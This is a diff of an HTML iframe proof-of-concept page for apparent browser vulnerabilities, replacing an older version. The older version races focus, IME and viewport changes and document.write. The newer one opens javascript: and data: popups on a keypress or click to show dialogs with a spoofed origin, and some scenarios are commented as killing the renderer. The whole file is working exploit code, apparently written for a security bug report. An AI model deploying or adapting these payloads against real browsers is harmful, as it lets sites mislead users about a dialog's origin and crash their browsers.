@@ -1,115 +1,68 @@
+
+
 <!doctype html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
 <style>
-html,body{height:100%;margin:0;font-family:Arial}
-#focusElem{opacity:0.01;width:1px;height:1px;border:0;padding:0;margin:0}
-.info{padding:8px;font-size:13px;color:#222}
+html { font-family: sans-serif; }
+#focusElem { opacity: 0.00001; width:1px; height:1px; }
 </style>
 </head>
 <body>
-  <div class="info">
-    iframe PoC — has hidden small inputs. Use parent page to trigger strategies.
-  </div>
 
-  <!-- Two hidden inputs to rapidly toggle IME -->
-  <input id="focusElem" autocomplete="off" />
-  <input id="focusElem2" autocomplete="off" style="opacity:0.01;position:fixed;left:-10px;top:0;width:1px;height:1px;border:0">
+<p> <span id="originOutput"></span></p>
+
+<input id="focusElem">
 
 <script>
-const f1 = document.getElementById('focusElem');
-const f2 = document.getElementById('focusElem2');
 
-function safeFocus(el) {
-  try { el.focus(); } catch(e) {}
+originOutput.innerText = window.location.origin;
+
+var scenario = 'popup'; // Default scenario
+var query = window.location.search;
+
+if (query) {
+  scenario = query.substr(1); // Strip leading '?'
 }
 
-// SHORT TIMING utility
-function quick(n, fn) {
-  setTimeout(fn, n);
-}
+var newWinParams = 'width=800,height=400,top=100';
 
-// Strategy implementations triggered by postMessage from parent
-function strategy_focus_switch() {
-  // Focus sequence: f1 -> ask parent to focus -> f2 -> f1 quickly
-  safeFocus(f1);
-  window.parent.postMessage('focus-parent', '*');
-  quick(10, ()=> safeFocus(f2));
-  quick(20, ()=> safeFocus(f1));
-}
+var runPoC = () => {
 
-function strategy_focus_blur_race() {
-  // Rapidly focus/blur to create show/hide IME sequences
-  safeFocus(f1);
-  quick(8, ()=> { try { f1.blur(); } catch(e){} });
-  quick(16, ()=> safeFocus(f2));
-  quick(24, ()=> { try { f2.blur(); } catch(e){} });
-  quick(32, ()=> safeFocus(f1));
-}
-
-function strategy_double_open_docwrite() {
-  // 1) open a data: URL (usually allowed)
-  // 2) very shortly after, open a javascript: URL or write into opened window
-  // This tries to create a navigation/commit replacement race.
-  try {
-    const win1 = window.open('data:text/html,<title>temp</title><body>tmp</body>', '_blank', 'width=400,height=300,top=10');
-    // slight delay then write / doc replace
-    quick(20, () => {
-      try {
-        // If win1 is same-origin (data: often treated as opaque) we'll attempt doc write
-        // If blocked, this will still attempt to create a second navigation quickly.
-        win1.document.open();
-        win1.document.write('<script>document.title="spoof?";</script><div>docwrite</div>');
-        win1.document.close();
-      } catch(e) {
-        // fallback: open a javascript: URL (may be blocked in some Chrome builds)
-        try {
-          window.open('javascript:document.write("X")', '_blank', 'width=400,height=300,top=10');
-        } catch(err) {}
-      }
-    });
-  } catch(e) {
-    // fallback attempt
-    try { window.open('javascript:alert("fallback")', '_blank'); } catch(_) {}
+  if (scenario == 'popup') {
+    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)', '_blank', newWinParams);
+  } else if (scenario == 'tab') {
+    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)');
+  } else if (scenario == 'data') {
+    var win = window.open('data:,Hello', '_blank', newWinParams);
+    setTimeout(() => {
+      win.alert('JS dialog from iframe, origin: '+window.origin);
+    }, 100);
+  } else if (scenario == 'protocol') {
+    var win = window.open('test:', '_blank', newWinParams);
+    setTimeout(() => {
+      win.alert('JS dialog from iframe, origin: '+window.origin);
+    }, 100);
+  } else if (scenario == 'docwrite1') {
+    // Results in renderer kill: bad_message::RFH_CAN_COMMIT_URL_BLOCKED
+    var win = window.open('javascript:document.write("test")', '_blank', newWinParams);
+  } else if (scenario == 'docwrite2') {
+    // Results in renderer kill: bad_message::RFH_INVALID_ORIGIN_ON_COMMIT
+    var win = window.open('data:,Hello', '_blank', newWinParams);
+    setTimeout(() => {
+      win.document.write('test');
+    }, 100);
   }
+
 }
 
-function strategy_visual_viewport_race() {
-  // Use visualViewport if available to cause rapid viewport resize events plus scroll
-  if (window.visualViewport) {
-    // trigger a series of small scrolls and height changes to the document to emulate keyboard-driven viewport changes
-    const origH = document.body.style.height || '';
-    document.body.style.height = '2000px';
-    // start small scroll
-    window.scrollTo(0, 200);
-    quick(12, ()=> window.scrollTo(0, 0));
-    quick(24, ()=> window.scrollTo(0, 300));
-    // also focus input mid-sequence
-    quick(8, ()=> safeFocus(f1));
-    quick(18, ()=> { try { f1.blur(); } catch(e){} });
-    quick(30, ()=> document.body.style.height = origH);
-  } else {
-    // fallback: just do fast focus/blur
-    strategy_focus_blur_race();
-  }
-}
+setInterval(() => {
+  focusElem.focus();
+}, 100);
 
-// Listen commands from parent
-window.addEventListener('message', (ev) => {
-  const cmd = ev.data;
-  if (!cmd) return;
-  if (cmd === 'focus-iframe-input') safeFocus(f1);
-  else if (cmd === 'blur-iframe-input') try { f1.blur(); } catch(e){}
-  else if (cmd === 'do-double-open') strategy_double_open_docwrite();
-  else if (cmd === 'visual-viewport-race') strategy_visual_viewport_race();
-  else if (cmd === 'run-all') {
-    strategy_focus_switch(); quick(40, strategy_double_open_docwrite); quick(80, strategy_visual_viewport_race);
-  }
-}, false);
+focusElem.addEventListener('keypress', runPoC);
 
-// Some autonomous aggressiveness: keep a gentle focus attempt but not too frequent
-let aggressiveInterval = setInterval(()=>{ try { f1.focus(); } catch(e){} }, 450);
+window.addEventListener('click', runPoC);
 
 </script>
 </body>
